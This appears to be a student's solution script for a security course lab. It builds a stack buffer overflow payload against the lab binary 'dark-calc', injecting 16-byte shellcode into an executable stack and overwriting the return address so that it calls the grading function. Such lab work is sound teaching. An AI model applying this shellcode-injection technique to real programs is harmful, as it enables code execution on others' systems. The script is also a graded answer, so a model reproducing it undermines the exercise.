#!/usr/bin/env python3
"""Lab3 Task 2 -- dark-calc: run machine code that we put on the stack.

dark-calc maps its own stack at the fixed address 0x721000000000 with
PROT_READ|PROT_WRITE|PROT_EXEC (init_fixed_stack, called before __wrap_main
switches %rsp to it), so the stack is both executable and never moves.
Inside input() the buffer lives at

    0x721000800fd0   expression[16]
    0x721000800fe0   saved rbp
    0x721000800fe8   return address

which means the payload's return address is 24 bytes above the buffer and
can simply be the buffer's own address.

The shellcode (16 bytes) has to live in the 24 bytes in front of the return
address; it cannot `call` grade_eval because a rel32 call only reaches
+-2 GiB and the stack is at 0x7210... while .text is at 0x0040....  So it
pushes the target address and uses `ret` as the indirect jump.

    mov  edi, 4          bf 04 00 00 00   grade_eval's argument
    push 0x4018c1        68 c1 18 40 00   "ret" gadget, the address
                                          grade_eval will return to
    push 0x401a87        68 87 1a 40 00   grade_eval
    ret                  c3               jump there

Alignment: when input() returns, %rsp == buffer + 32 (it popped the return
address we overwrote), and buffer % 16 == 0.  After the two pushes and the
`ret`, grade_eval is entered with %rsp == buffer + 24, i.e. %rsp % 16 == 8,
exactly what the ABI asks for -- a misaligned %rsp can crash inside the
printf() that grade_eval calls.  grade_eval flushes stdout itself, so its
message survives even if the process died afterwards.

For the last hop we use the `ret` gadget again and then main(), so the
program does not crash: main() re-enters the loop, stdin is at EOF, and
input() prints the answer and calls exit(0).
"""

import struct
import sys

STACK_BUF = 0x721000800FD0  # &expression inside input(), fixed by init_fixed_stack
BUF_TO_RET = 24

GRADE_EVAL = 0x401A87
MAIN = 0x401AC3
RET = 0x4018C1


def p64(value):
    return struct.pack("<Q", value)


def p32(value):
    return struct.pack("<I", value)


shellcode = b"".join(
    [
        b"\xbf" + p32(4),  # mov edi, 4
        b"\x68" + p32(RET),  # push ret
        b"\x68" + p32(GRADE_EVAL),  # push grade_eval
        b"\xc3",  # ret
    ]
)
assert len(shellcode) == 16

payload = b"".join(
    [
        shellcode.ljust(BUF_TO_RET, b"\x90"),  # pad with nops up to saved rbp
        p64(STACK_BUF),  # overwritten return address -> start of our code
        p64(MAIN),  # main()'s own return address, used after grade_eval
    ]
)

assert b"\n" not in payload

sys.stdout.buffer.write(payload)
